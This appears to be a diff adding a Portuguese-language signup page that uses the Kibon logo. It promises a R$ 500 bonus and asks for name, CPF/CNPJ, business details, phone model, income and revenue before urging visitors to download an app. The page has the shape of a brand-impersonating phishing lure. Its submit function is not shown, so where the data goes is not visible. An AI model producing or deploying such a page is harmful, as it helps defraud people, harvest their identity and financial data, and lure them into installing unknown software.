@@ -18,31 +18,96 @@
         .bonus-badge {
             background: var(--green); color: white; text-align: center;
             padding: 10px; font-weight: 700; font-size: 14px;
-            text-transform: uppercase;
+            text-transform: uppercase; letter-spacing: 1px;
         }
 
-        .header { padding: 30px 20px 10px; text-align: center; }
-        .header img { width: 120px; }
+        .header { padding: 25px 20px 10px; text-align: center; }
+        .header img { width: 110px; }
         .header h1 { font-size: 20px; color: var(--kibon-red); margin: 10px 0 5px; font-weight: 700; }
         .header p { font-size: 13px; color: #666; margin: 0; }
 
-        .form-body { padding: 25px; }
-        .input-group { margin-bottom: 15px; }
-        label { display: block; font-size: 12px; font-weight: 600; color: #444; margin-bottom: 5px; }
+        .form-body { padding: 20px 25px; }
+        .input-group { margin-bottom: 12px; }
+        label { display: block; font-size: 12px; font-weight: 600; color: #444; margin-bottom: 4px; }
         input, select {
-            width: 100%; padding: 12px; border: 2px solid #eee; border-radius: 10px;
+            width: 100%; padding: 11px; border: 2px solid #eee; border-radius: 10px;
             font-size: 14px; transition: 0.3s; outline: none;
         }
         input:focus { border-color: var(--kibon-red); }
 
         .info-bonus {
             background: #fff9f0; border: 1px dashed #ffcc00; border-radius: 10px;
-            padding: 15px; margin-top: 15px; text-align: center; font-size: 14px;
+            padding: 12px; margin-top: 10px; text-align: center; font-size: 13px;
         }
-        .info-bonus b { color: var(--green); font-size: 18px; }
+        .info-bonus b { color: var(--green); font-size: 16px; }
 
         .btn-main {
             width: 100%; padding: 16px; background: var(--kibon-red); color: white;
             border: none; border-radius: 12px; font-size: 16px; font-weight: 700;
-            cursor: pointer; transition: 0.3s; margin-top: 20px;
+            cursor: pointer; transition: 0.3s; margin-top: 15px;
         }
+        .btn-main:hover { background: var(--kibon-dark); transform: scale(1.02); }
+
+        .footer { text-align: center; padding: 15px; font-size: 11px; color: #999; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="bonus-badge">🎁 Bônus de R$ 500,00 Disponível</div>
+    
+    <div class="header">
+        <img src="https://logodownload.org/wp-content/uploads/2017/05/kibon-logo-1.png" alt="Kibon">
+        <h1>Cadastro de Parceiro</h1>
+        <p>Preencha os dados para liberar seu bônus</p>
+    </div>
+
+    <form class="form-body">
+        <div class="input-group">
+            <label>Nome Completo</label>
+            <input type="text" id="nome" placeholder="Seu nome" required>
+        </div>
+
+        <div class="input-group">
+            <label>CPF ou CNPJ</label>
+            <input type="text" id="documento" placeholder="000.000.000-00" required>
+        </div>
+
+        <div class="input-group">
+            <label>Nome do Comércio (Fantasia)</label>
+            <input type="text" id="comercio" placeholder="Nome da sua loja" required>
+        </div>
+
+        <div style="display: flex; gap: 10px;">
+            <div class="input-group" style="flex: 2;">
+                <label>Cidade</label>
+                <input type="text" id="cidade" placeholder="Cidade" required>
+            </div>
+            <div class="input-group" style="flex: 1;">
+                <label>Estado</label>
+                <input type="text" id="estado" placeholder="UF" maxlength="2" required>
+            </div>
+        </div>
+
+        <div class="input-group">
+            <label>Modelo do Aparelho Celular</label>
+            <input type="text" id="celular_modelo" placeholder="Ex: iPhone 13, Galaxy S21" required>
+        </div>
+
+        <div class="input-group">
+            <label>Renda Mensal Estimada</label>
+            <input type="text" id="renda" placeholder="R$ 0,00" required>
+        </div>
+
+        <div class="input-group">
+            <label>Faturamento Atual do Ponto</label>
+            <input type="text" id="faturamento" placeholder="R$ 0,00" required>
+        </div>
+
+        <div class="info-bonus">
+            Ao finalizar o cadastro, baixe o app e receba:<br>
+            <b>R$ 500,00 DE SALDO BÔNUS</b>
+        </div>
+
+        <button type="button" class="btn-main" onclick="finalizar()">CADASTRAR E RECEBER BÔNUS</button>
+    </form>
